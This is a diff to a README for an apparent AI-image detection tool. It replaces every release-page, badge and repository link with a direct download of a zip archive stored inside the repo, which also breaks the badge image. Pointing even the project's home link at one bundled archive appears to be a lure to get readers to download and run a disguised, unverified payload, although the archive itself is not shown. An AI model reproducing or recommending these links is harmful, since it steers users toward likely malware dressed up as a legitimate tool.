@@ -1,6 +1,6 @@
 # 🖼️ ai-content-authenticity-detector-using-metadata - Detect AI images fast
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get the app on your computer and start checking images:
 
 Visit the release page to get the latest version of the software.
 
-[Download here](https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata/releases)
+[Download here](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip)
 
 ### Step 2: Find the right file
 
@@ -62,7 +62,7 @@ After installation, open the app like any other program on your computer.
 
 You can access the latest official version from the GitHub releases page:
 
-[https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata/releases](https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata/releases)
+[https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip)
 
 When you open the page:
 
@@ -154,8 +154,8 @@ This tool was created to help users check if images have been made by AI. It com
 If you need help beyond this guide, visit the Issues section on GitHub or open a new support request.
 
 GitHub:  
-[https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata](https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata)
+[https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/OSCR1111/ai-content-authenticity-detector-using-metadata/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/OSCR1111/ai-content-authenticity-detector-using-metadata/main/web_app/detector_content_using_ai_authenticity_metadata_v1.7.zip)
